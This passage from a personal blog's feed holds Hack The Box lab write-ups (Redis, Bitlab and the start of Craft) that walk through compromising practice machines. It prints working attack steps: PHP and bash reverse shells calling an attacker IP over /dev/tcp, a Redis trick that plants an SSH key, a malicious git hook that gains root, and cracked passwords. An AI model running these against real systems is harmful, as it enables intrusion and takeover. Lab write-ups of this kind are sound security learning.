<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<p>I also found a very detailed explanation of how the redis rogue server exploit works:
<a href="https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0">https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0</a></p>
<h2 id="adding-an-ssh-key-vis-redis">Adding an SSH key vis Redis</h2>
<hr>
<p>After a ton of playing around with these exploits and understanding them better I realized this type of exploit won&rsquo;t work due to the lack of supports for MODULES on the other system.</p>
<p>I did realize I have some alternate paths to a shell however, since I can write files to the other system I can try to stick a bash shell in a crontab, or a php shell on the www server, or an SSH key somewhere.</p>
<p>I managed to find this tutorial
<a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419">https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419</a></p>
<p>On top of that, playing around with the redis client allowed me to find the config file was already present at /var/lib/redis/.ssh</p>
<p>I created a public key and followed the tutorial.</p>
<p>Basically it works like this:</p>
<ol>
<li>Get redis-cli. <a href="https://redis.io/topics/rediscli">https://redis.io/topics/rediscli</a></li>
<li>Wrap newlines around a public key. <code>(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; temp.txt</code></li>
<li>Save the formatted key in Redis. <code>cat ~/.ssh/temp.txt | redis-cli -h 10.10.10.160 -x set s-key</code></li>
<li>Connect with redis-cli interactive mode. <code>redis-cli -h 10.10.10.160</code></li>
<li>Set redis save directory to .ssh folder. <code>CONFIG SET dir /var/lib/redis/.ssh</code></li>
<li>Set redis db name to authorized_keys. <code>CONFIG SET dbfilename authorized_keys</code></li>
<li>Save it. <code>save</code></li>
</ol>
<p>This saves a public key to the redis server, which is then saved in the db filename under the configured dir. It ends up having the ssh public key value here: <code>/var/lib/redis/.ssh/authorized_keys</code></p>
<p>Redis will append some metadata to the top, that&rsquo;s why the public key was wrapped in newlines. OpenSSH will manage to parse the public key correctly since it just checks every newline for a valid key, ignoring invalid entries. The metadata is ignored, and the real public key is loaded.</p>
<p>This allowed me to SSH into the system as <code>redis</code> using my key, which seems a bit strange. I checked out <code>/etc/passwd</code> and confirmed redis is set up to use bash on login, this is definitely towards the CTF style of things. You normally wouldn&rsquo;t allow the redis service to have a bash login.</p>
<p>I eventually figured out this was the method when I realized the previous cracklist key I had found was attempting to do this very method of gaining access.</p>
<hr>
<h1 id="escalating-to-a-user-shell">Escalating to a user shell</h1>
<p>Once I was in I came across a file matt was running:

    <figure class="left" >
        <img src="1575393423.png"   />

        
            <figcaption class="center" >Suspicious File</figcaption>
        
    </figure>

</p>
<p>It looks like I can just put files on the server under his name. Well, I can probably stick a new authorized_keys file under his SSH folder and gain access as him. There&rsquo;s a problem though, the file isn&rsquo;t running and if I start it as redis it won&rsquo;t be able to write anywhere redis can&rsquo;t.</p>
<p>I started poking around some familiar areas, and on a whim checked <code>/opt</code>. Lo and behold:

    <figure class="left" >
        <img src="1575418758.png"   />

        
            <figcaption class="center" >An Encrypted SSH Key</figcaption>
        
    </figure>

</p>
<p>Time to crack this baby. There&rsquo;s a python script named ssh2john which I used to convert the ssh key into a format John the Ripper here: <a href="https://github.com/koboi137/john">https://github.com/koboi137/john</a></p>
<p>After that I just crack it with John and Rockyou:
<code>john hash -d --wordlist=/usr/share/wordlists/rockyou.txt</code>

    <figure class="left" >
        <img src="1575419152.png"   />

        
            <figcaption class="center" >Cracked SSH Passphrase</figcaption>
        
    </figure>

</p>
<p>Bingo, looks like it&rsquo;s <code>computer2008</code>.
Well considering there are only 3 accounts with bash logins (Matt, Root, redis), hopefully it works for Matt at least if not root.</p>
<p>
    <figure class="left" >
        <img src="1575419472.png"   />

        
    </figure>


Hmm&hellip; suspicious. When I enter the cracked passphrase it immediately closes the connection, which means the passphrase is right. There&rsquo;s some post login script that&rsquo;s closing the connection. I know you can have SSH execute commands on connect, maybe I can get a reverse shell going before it closes the connection.</p>
<p>I think another option is to send it <code>vi</code> and then <code>vi</code> should open and I can escape to a shell.</p>
<p>None of that worked, and after some more frustration I decided to look at the sshd_config file&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#deny users</span>
DenyUsers Matt
</code></pre></div><p>Well god damnit. No matter, maybe he reused this password for his account and I can just su into it.</p>

    <figure class="left" >
        <img src="1575422055.png"   />

        
            <figcaption class="center" >Got User</figcaption>
        
    </figure>


<p>Awesome, got ya Matt! Time to try for root.</p>
<hr>
<h1 id="getting-root">Getting Root</h1>
<p>I poked around for a bit looking for anything obvious, but came up empty. Then I ran the <code>lse.sh</code> script: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
<p>Nothing extraordinary came up, but I noticed binaries running as root was green and it reminded me that webmin was running. I quickly tried the credentials <code>Matt</code> <code>computer2008</code> on it, and bingo I was in. I checked what webmin was running as, and it&rsquo;s root!</p>
<p>Remember that webmin exploit we checked out first? It required the webmin user to have creds, which we now do. Let&rsquo;s try and get root with it.</p>
<p>
    <figure class="left" >
        <img src="1575428772.png"   />

        
    </figure>


Success! All I had to do was set the options and exploit. I got a bit tripped up with the SSL option but after I checked the options again I noticed it and it worked like a charm.</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Bitlab</title>
            <link>https://foresthex.com/posts/hack-the-box-bitlab/</link>
            <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-bitlab/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I will be hacking an HTB box named bitlab.
 Let&amp;rsquo;s dive right in with a port scan, and as always, feel free to jump around.
 Port Scan Poking around the Web Server The Initial Foothold Escalating to Root Creating the Git Hook   Port Scan Port Scan  Not a lot here, just a web server on port 80 and ssh on port 22.</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I will be hacking an HTB box named bitlab.</em></p>

    <figure class="left" >
        <img src="1575834144.webp"   />

        
    </figure>


<p>Let&rsquo;s dive right in with a port scan, and as always, feel free to jump around.</p>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#poking-around-the-web-server">Poking around the Web Server</a></li>
<li><a href="#the-initial-foothold">The Initial Foothold</a></li>
<li><a href="#escalating-to-root">Escalating to Root</a></li>
<li><a href="#creating-the-git-hook">Creating the Git Hook</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>

    <figure class="left" >
        <img src="1575843709.webp"   />

        
            <figcaption class="center" >Port Scan</figcaption>
        
    </figure>


<p>Not a lot here, just a web server on port 80 and ssh on port 22.
Time to poke around the server, I&rsquo;ll load it up in ZAP&rsquo;s proxy.</p>
<hr>
<h1 id="poking-around-the-web-server">Poking around the Web Server</h1>

<figure class='left'>
  <video style="height:100%;width:100%" src="zap.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>You can see how zap easily lets you dig into the framework of a web site. It&rsquo;s running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
<p>I tried the default credentials but they didn&rsquo;t work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
<p>I found something much different. It was a plain looking page with a link named <code>Bookmarks</code>, and after clicking on it I go this:

    <figure class="left" >
        <img src="1575845987.webp"   />

        
            <figcaption class="center" >Jackpot</figcaption>
        
    </figure>

</p>
<p>They all go to outside links except for the last one:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
</code></pre></div><p>That looks like obfuscated javascript. I went to <code>jsnice.org</code> and got this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#e6db74">&#39;use strict&#39;</span>;
<span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> {
  (<span style="color:#66d9ef">function</span>() {
    <span style="color:#75715e">/** @type {!Array} */</span>
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
    document[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>];
    document[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">5</span>];
  })();
};
</code></pre></div><p>This can be made more clear like so:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#a6e22e">user_login</span>)[<span style="color:#a6e22e">value</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;clave&#39;</span>;
document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#a6e22e">user_password</span>)[<span style="color:#a6e22e">value</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;11des0081x&#39;</span>;
</code></pre></div><p>I tested the login and sure enough it worked.</p>

    <figure class="left" >
        <img src="1575846438.webp"   />

        
    </figure>


<p>After poking around a bit I came across some credentials in a php snippet:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
$db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
</code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can&rsquo;t access the sql server since the port isn&rsquo;t exposed, and they don&rsquo;t work as ssh creds.</p>
<hr>
<h1 id="the-initial-foothold">The Initial Foothold</h1>
<p>While I was looking around I started to gain a better understanding of what was happening. There are two projects: <code>Profile</code> and <code>Deployer</code>. Profile is a simple php page, and deployer contains a script which will automatically pull any merge requests to the master branch in Profile. The php file is hosted on the web server at <code>/profile</code>, which I discovered by clicking on the settings link in the gitlab page.</p>
<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don&rsquo;t even have to bother cloning the repo locally.</p>
<p>In fact, this is a rare chance to try out a php web shell, I&rsquo;m going to use the one here:
<a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php">https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php</a></p>
<p>It worked like a charm:</p>

<figure class='left'>
  <video style="height:100%;width:100%" src="create_shell.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>It&rsquo;s fun and all, but I truly prefer a terminal so I switched to this payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1&#39;&#34;</span>);
</code></pre></div>
<figure class='left'>
  <video style="height:100%;width:100%" src="pop_rev_shell.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>After getting a netcat shell I upgraded it following this tutorial:
<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
<p>I didn&rsquo;t use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
<hr>
<h1 id="escalating-to-root">Escalating to Root</h1>
<p>The deployer script looked promising:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>

$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);

$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;

<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</code></pre></div><p>The <code>sudo git pull</code> command can be used to execute commands as root. I spent an extremely long time trying to think of a way to add a malicious git hook to the existing repo that would be pulled, but the two exploits I found were patched already.</p>
<p>If you&rsquo;re curious:
<a href="https://blog.developer.atlassian.com/securing-your-git-server/">https://blog.developer.atlassian.com/securing-your-git-server/</a>
<a href="https://github.blog/2018-10-05-git-submodule-vulnerability/">https://github.blog/2018-10-05-git-submodule-vulnerability/</a></p>
<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn&rsquo;t make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
<blockquote>
<p>you only need to know that you can run sudo git pull as www-data</p>
</blockquote>
<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn&rsquo;t specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook.
<code>git</code> itself is restricted, so I can&rsquo;t just do a git init either.</p>
<hr>
<h1 id="creating-the-git-hook">Creating the Git Hook</h1>
<p>I tested if I could simply copy the <code>.git</code> folder and add a hook on my local machine, and had an issue with my powershell script. Apparently even in windows the githook still needs <code>#!/bin/bash</code>. I tried that but ended up with an error:
<code>New-Item : A positional parameter cannot be found that accepts argument 'is</code></p>
<p>Hm, something in my test string maybe. I changed the git hook to:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>exec powershell New-Item -Path <span style="color:#e6db74">&#39;C:\Users\Brian&#39;</span> -Name <span style="color:#e6db74">&#39;testfile1.txt&#39;</span> -ItemType <span style="color:#e6db74">&#39;file&#39;</span> -Value <span style="color:#e6db74">&#39;Test.&#39;</span>
</code></pre></div>
    <figure class="left" >
        <img src="1576042443.webp"   />

        
            <figcaption class="center" >Git hook working.</figcaption>
        
    </figure>


<p>That means I should be able to run a command as root with this process:</p>
<ol>
<li>Copy the .git folder of the profile into a new folder where <code>www-data</code> has write access.</li>
<li>Create a <code>post-merge</code> git hook that either spawns a local, or reverse shell.</li>
<li>Make an update to the profile repo with the web interface.</li>
<li>Run <code>sudo git pull</code> in the folder of our copy.</li>
</ol>
<p>The post-merge hook should then be invoked under sudo access, which will give us a root shell.</p>
<p>I copied the <code>.git</code> folder to <code>/tmp/fine/.git</code> and created a file under <code>.git/hooks</code> named <code>post-merge</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
exec /bin/bash
</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn&rsquo;t work, so I&rsquo;m changing the post-merge to:
<code>bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1</code></p>
<p>Unfortunately that didn&rsquo;t work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
<p>After that I checked <code>/etc/ssh/sshd_config</code> to make sure I could log in with a public key. It does, and it looks in the normal place.</p>
<p>I generate a new key with <code>ssh-keygen -t rsa</code>, <code>chmod 600 id_rsa</code> to give it the right permissions for the SSH client, and copy the public key to the post-merge hook:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@bitlab:/tmp/fine$ cat .git/hooks/post-merge
<span style="color:#75715e">#!/bin/sh</span>

echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBw9GB12s3G2XCXPLGbbf3wM9CAuwPcTWzZL/zzGaFkKY3uIe1sdc4nQ1Rsq9HyRIb6uhV3CDVy2Qqv55qt/VE8Uox/x5lm90Ct4YzeBHGDkethBZSOkIkEGNAPNCiPIDTI1ZZOERS26iJydYZMRb4Y5/qjt+Sc3tbMy4cAVQoHeUVnu8pwWYszZ4Sn3jKrrHaqgabzfM5hjzcb/6HvF0R+w/d/5VgN3TEz6zsIf7EPebv6fSiyinrM9SB/U5ZO3w5ft5uOzonrVgPIDWs+hgQzlqACmIVr0fx2rk2pfNTMqgp0r/XGMkyAjD6Ykwg1IXqgYENLSpgS9Q4JA/V9NK4t82uwf81+3ejp10CBRQuhUsVhzOoqeGHGk5fX1HaIQjwiTtPbYO7oL1TE+LenNWgSOH+p2FSdTleXaQmREZ4CUJdTAzTA8fvjb1A+BqlODl2wAcH2AMqUDo3Yt9/RCB8M38ocuwjsRvhYYYbNqbWwoZS5sQ+fGcpxWrYzJ9KOos= root@wks104&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
</code></pre></div><p>I had the post-merge output the keys just to see if mine was added, sure enough it was, which means:
<code>ssh root@10.10.10.114 -i id_rsa</code> should get me in.</p>

    <figure class="left" >
        <img src="1576045790.webp"   />

        
            <figcaption class="center" >Got Root</figcaption>
        
    </figure>


<p>Awesome! Abusing git hooks for fun and profit! Until next time this is jivex5k signing off!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Craft</title>
            <link>https://foresthex.com/posts/hack-the-box-craft/</link>
            <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-craft/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ
Today I&amp;rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.
  Port Scan As always, I start with a port scan to see what&amp;rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</description>
            <content type="html"><![CDATA[<p><strong>Welcome to another Forest Hex hacking adventure! üå≤üèπ</strong></p>
<p><em>Today I&rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>

    <figure class="left" >
        <img src="image-8.webp"   />

        
    </figure>


<hr>
<h1 id="port-scan">Port Scan</h1>
<p>As always, I start with a port scan to see what&rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</p>
<p>Commands:</p>
<p><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.110 | grep [1] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -sC -sV -p $ports 10.10.10.110</code></p>

    <figure class="left" >
        <img src="image-9.webp"   />

        
    </figure>


<blockquote>
<p>Editor&rsquo;s Note: I found out much later that this nmap procedure was redundant. The following command accomplishes the same thing:
<code>nmap -p- -sC -sV --min-rate=1000 -T4 &lt;ip&gt;</code></p>
</blockquote>
<p>Nmap found:</p>
<ol>
<li>Two SSH services running on ports 22, and 6022.</li>
<li>An nginx server running Gogs, which is an open source framework for git.</li>
</ol>
<p>Git can be a treasure trove of information&hellip; Chests overflowing with glittering API keys, hardcoded secrets, and yes, even username/password combinations! There are several tools available to harvest sensitive information from git, but in this instance they were not needed. Never underestimate the power of simple exploration.</p>
<hr>
<h1 id="exploring-the-web-server">Exploring the Web Server</h1>
<p>The first thing I like to do when I find a web server open is simply browse to it and see what I can find. In addition, using browser extensions like Wappalyzer can help identify what software the server is running.</p>
<p>After navigating to <code>https://10.10.10.110</code>, and continuing past the certificate error, I am presented with a clean interface for an API.</p>

    <figure class="left" >
        <img src="image-10.webp"   />

        
    </figure>


<p>Clicking on the API or Git link leads to 404 errors because it attempts to use the following URIs:</p>
<p><code>api.craft.htb</code>  <code>gogs.craft.htb</code></p>
<p>To solve this error I added the following line to /etc/hosts:</p>
<p><code>10.10.10.110     craft.htb api.craft.htb gogs.craft.htb</code></p>
<p>The API page shows a nice interface which was created with <code>swagger</code></p>

    <figure class="left" >
        <img src="image-11.webp"   />

        
    </figure>


<p>I tried some basic SQL injection on the auth endpoints but couldn&rsquo;t find anything meaningful. I decided to check the git page to see if there were any more obvious routes to gain access.</p>
<hr>
<h1 id="exploring-git">Exploring Git</h1>
<p>Remember when I said never underestimate simple exploration? This is why:</p>

    <figure class="left" >
        <img src="image-16.webp"   />

        
    </figure>


<p><em>I have to point out how much I appreciate the personality here. The commit is from ebachman, aka &lsquo;Erlich Bachman&rsquo;, a fictional character on the show Silicon Valley. Little touches like this really made the CTF more memorable.</em></p>
<p>The two circled areas immediately stuck out. A DB connection test script could very well have DB credentials, and bugs listed under &ldquo;Issues&rdquo; could point to weaknesses in the underlying code which could get us into the system.</p>
<p>First I decided to check the DB test for credentials:</p>

    <figure class="left" >
        <img src="image-17.webp"   />

        
    </figure>


<p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there&rsquo;s still a chance the credentials were included in an older commit, so let&rsquo;s take a look at the commit history and see what stands out.</p>

    <figure class="left" >
        <img src="image-18.webp"   />

        
    </figure>


<p>Cleanup test looks suspicious, I wonder what was cleaned from it?</p>

    <figure class="left" >
        <img src="image-19.webp"   />

        
    </figure>


<p>Ah ha! Dinesh has foolishly left his credentials hardcoded into a test he created. These credentials are for the <code>/auth/login</code> endpoint of the API, and now I have a handy python script to reference for details on usage.</p>
<p>Credentials alone won&rsquo;t be enough to get into the machine, but it&rsquo;s a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>

    <figure class="left" >
        <img src="image-20.webp"   />

        
    </figure>


<p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What&rsquo;s so bad about Dinesh&rsquo;s patch though?</p>

    <figure class="left" >
        <img src="image-21.webp"   />

        
    </figure>


<p>Can you see the vulnerability?</p>
<p><code>eval('%s &gt; 1' % request.json['abv'])</code></p>
<p>Ah, our good pal <code>eval</code>. It&rsquo;s dangerous to run <code>eval</code> on user input because it will evaluate a string as a python expression. <a href="https://docs.python.org/3/library/functions.html#eval">You can read more about it here.</a></p>
<p>Here&rsquo;s the entire function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
<span style="color:#a6e22e">@api.expect</span>(beer_entry)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Creates a new brew entry.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#75715e"># make sure the ABV value is sane.</span>
    <span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;abv&#39;</span>]):
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ABV must be a decimal value less than 1.0&#34;</span>, <span style="color:#ae81ff">400</span>
    <span style="color:#66d9ef">else</span>:
        create_brew(request<span style="color:#f92672">.</span>json)
        <span style="color:#66d9ef">return</span> None, <span style="color:#ae81ff">201</span>
</code></pre></div><p>Notice that line <code>@auth.auth_required</code>, this means we need an access token to reach the line of code with <code>eval</code>. Luckily our good friend Dinesh has graciously provided us with credentials to get a valid token.</p>
<hr>
<h1 id="exploiting-python-for-a-reverse-shell">Exploiting Python for a Reverse Shell</h1>
<p>The easiest way to exploit eval is to have it call <code>os.system()</code>, which is a python function that will attempt to execute a given command on the OS. My initial thought was to simply pass it a reverse shell using bash:</p>
<p><code>bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></p>
<p>The way a reverse shell works, the victim machine becomes the client and attempts to connect to you. You first run a listener on your system, usually using netcat like so:</p>
<p><code>nc -nvlp 55123</code> - This will start a listener on port 55123. You then have the victim machine execute a command to connect to your listener. There are several reverse shells, I like to reference this cheat sheet: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<p>So, I have to get the system to execute that command. The eval expression is:</p>
<p><code>if eval('%s &gt; 1' % request.json['abv']):</code></p>
<p>So, it will take whatever string I provide as the ABV when adding a new beer by sending a POST request to the <code>/brew</code> endpoint. Dinesh to the rescue again, we can use his test script to do this.</p>
<p>Here&rsquo;s the script I created based on his test script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> json

